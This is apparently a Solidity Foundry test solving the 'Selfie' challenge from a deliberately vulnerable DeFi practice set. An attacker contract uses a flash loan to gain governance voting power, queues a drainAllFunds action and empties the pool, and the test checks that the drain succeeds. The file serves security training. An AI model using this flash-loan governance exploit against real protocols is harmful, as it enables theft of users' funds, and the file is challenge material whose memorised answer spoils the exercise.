// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract AttackerContract {
    SimpleGovernance simpleGovernance;
    uint256 actionId;

    address owner;

    constructor(SimpleGovernance _simpleGovernance){
        owner = msg.sender;
        simpleGovernance = _simpleGovernance;

    }

    function getFlashLoan(SelfiePool poolContract,uint256 borrowAmount) public{
        poolContract.flashLoan(borrowAmount);
    }

    function receiveTokens(DamnValuableTokenSnapshot token,uint256 borrowAmount) public {
        token.snapshot();
        actionId = simpleGovernance.queueAction(msg.sender,abi.encodeWithSignature("drainAllFunds(address)",owner),0);
        token.transfer(msg.sender,borrowAmount);

    }

    function attack() public {
        simpleGovernance.executeAction(actionId);
    }
}


contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(simpleGovernance);
        attackerContract.getFlashLoan(selfiePool,TOKENS_IN_POOL);
        vm.warp(block.timestamp+ 2 days);
        attackerContract.attack();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
